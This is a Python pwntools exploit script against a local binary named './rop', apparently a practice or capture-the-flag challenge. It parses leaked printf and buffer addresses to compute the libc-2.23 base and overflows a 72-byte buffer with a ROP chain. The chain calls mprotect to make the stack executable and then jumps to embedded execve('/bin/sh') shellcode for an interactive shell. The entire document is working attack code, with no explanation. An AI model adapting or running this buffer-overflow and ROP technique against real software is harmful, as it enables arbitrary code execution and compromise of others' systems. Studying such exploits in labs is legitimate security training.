from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
printf_offset = libc.symbols['printf']
mprotect_offset = libc.symbols['mprotect']

p = process('./rop')
#gdb.attach(p)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.recvuntil(": ")
libc = p.recvuntil("\n")
libc = int(libc, 16)

log.info("printf_offset: "+hex(printf_offset))

libc -= printf_offset

p.recvuntil(": ")
buf = p.recvuntil("\n")
buf = int(buf, 16)
back = str(hex(buf))
shellarea = int(back[0:11] + '000', 16)

log.info("buf: "+ hex(buf))
log.info("shellarea: "+hex(shellarea))
log.info("libcbase: "+hex(libc))

pop_rdi = libc + 0x21102
pop_rsi = libc + 0x1a288f
pop_rdx = libc + 0x1150a6
mprotect = libc + mprotect_offset

#Payload
payload = shellcode
payload += "A"*(72-len(shellcode))

#mprotect(shellarea, 0x1000, 0x7)
payload += p64(pop_rdi)
payload += p64(shellarea)
payload += p64(pop_rsi)
payload += p64(0x1000)
payload += p64(pop_rdx)
payload += p64(0x7)
payload += p64(mprotect)
payload += p64(buf)

p.send(payload)
p.interactive()
